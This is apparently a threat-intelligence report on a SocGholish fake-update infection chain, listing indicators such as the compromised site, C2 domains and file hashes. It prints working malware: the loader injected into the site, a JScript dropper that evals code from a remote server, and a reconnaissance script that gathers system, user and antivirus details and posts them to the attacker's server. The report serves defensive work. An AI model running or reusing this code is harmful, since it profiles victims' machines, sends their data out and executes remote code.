THREAT IDENTIFICATION:  SOCGHOLISH

STAGE 1 HOST DOMAIN
https://portonovoresidences.com/

STAGE 1 INJECTED JAVASCRIPT URLS
https://portonovoresidences.com/wp-content/plugins/page-loader/script.js?ver=6.3

STAGE 1 INJECTED JAVASCRIPT
;(function(z,i,u,n,m,e){m=i.createElement(u);e=i.getElementsByTagName(u)[0];m.async=1;m.src=n;e.parentNode.insertBefore(m,e);})(window,document,'script','https://trademark.iglesiaelarca.com/uJAG3nbyQhOZ2B2NufN4XHRJkgYpTZH8Sdr85Sf/Bbo=');window.onload = function() {
document.getElementById("plcover").style.opacity = "0";
document.getElementById("plcontent").style.opacity = "0";
setTimeout(function()
{
document.getElementById("plcover").style.display = "none";
document.getElementById("plcontent").style.display = "none";
}
, 1000);
}

ZIP FILE DOWNLOAD URL
https://trademark.iglesiaelarca.com/uJAG3nbyQhOZ2B2NufN4XHRJkgYpTZH8Sdr85Sf/Bbo=

ZIP FILE HASH
UpdateInstaller.zip
ac9a2ab5f80e868175321baf7f0d1147

JAVASCRIPT FILE HASH
Version.117.9553.15.js
25ce28490792a476e36d2e122d9a8990

JAVASCRIPT FILE CONTENTS
if (1) {
function a0_0x575c1f(_0x5b4d68) {
var _0x19e380 = 'responseText'
return _0x5b4d68[_0x19e380]
}

var a0_0xaf1778 = new this.ActiveXObject('MSXML2.XMLHTTP')
a0_0xaf1778.open('POST', 'https://mxn.photo.beyoudcor.com/editContent', false)
a0_0xaf1778.setRequestHeader('Upgrade-Insecure-Requests', '1')
a0_0xaf1778.send('8sWBOO/bSwT+cIlPZp8vYz0l8O7VcuXXooMYfUh+7Q==')
this.eval(a0_0x575c1f(a0_0xaf1778))
}

STAGE 3 PROXY FOR SOCGHOLISH C2
https://mxn.photo.beyoudcor.com/editContent

JAVASCRIPT RETURNED FOM STAGE 3
var qh = ''
var dr = new ActiveXObject('WScript.Shell')
var oa = new ActiveXObject('WScript.Network')
var wj = []
wj.push('b')
wj.push('500')
wj.push(WScript.ScriptFullName)
wj.push(oa.ComputerName)
wj.push(oa.UserName)
wj.push(oa.UserDomain)
wj.push(dr.ExpandEnvironmentStrings('%userdnsdomain%'))
wj.push(ju('CIMV2', 'Win32_ComputerSystem', 'Manufacturer'))
wj.push(ju('CIMV2', 'Win32_ComputerSystem', 'Model'))
wj.push(
  ju('CIMV2', 'Win32_BIOS', 'Version') +
    ju('CIMV2', 'Win32_BIOS', 'SerialNumber')
)
wj.push(ju('SecurityCenter2', 'AntiSpywareProduct', 'displayName'))
wj.push(ju('SecurityCenter2', 'AntiVirusProduct', 'displayName'))
wj.push(ju('CIMV2', 'CIM_NetworkAdapter', 'MACAddress'))
wj.push(ju('CIMV2', 'Win32_Process', 'Name'))
wj.push(ju('CIMV2', 'Win32_OperatingSystem', 'BuildNumber'))
function ju(pk, kk, om) {
  var rb = ''
  try {
    var no = GetObject('winmgmts:\\\\.\\root\\' + pk)
    var ro = no.ExecQuery('SELECT * FROM ' + kk, 'WQL')
    var mo = new Enumerator(ro)
    for (; !mo.atEnd(); mo.moveNext()) {
      var oq = mo.item()
      if (oq[om]) {
        rb += oq[om] + '|'
      }
    }
  } catch (e) {
    rb = '-1'
  }
  return rb
}
try {
  var wc = ''
  for (var ff = 0; ff < wj.length; ff++) {
    wc += ff + '=' + encodeURIComponent(wj[ff]) + '&'
  }
  var rb = ''
  var lf = new ActiveXObject('MSXML2.XMLHTTP')
  lf.open('POST', 'https://mxn.photo.beyoudcor.com/editContent', false)
  lf.setRequestHeader('Upgrade-Insecure-Requests', '1')
  lf.send(wc)
  rb = lf.responseText
  var evString = 'eval'
  this[evString](rb)
} catch (e) {}

PAYLOAD DOWNLOAD URL
Filtered out

PAYLOAD FILE HASH
Filtered out

PAYLOAD C2
Filtered out




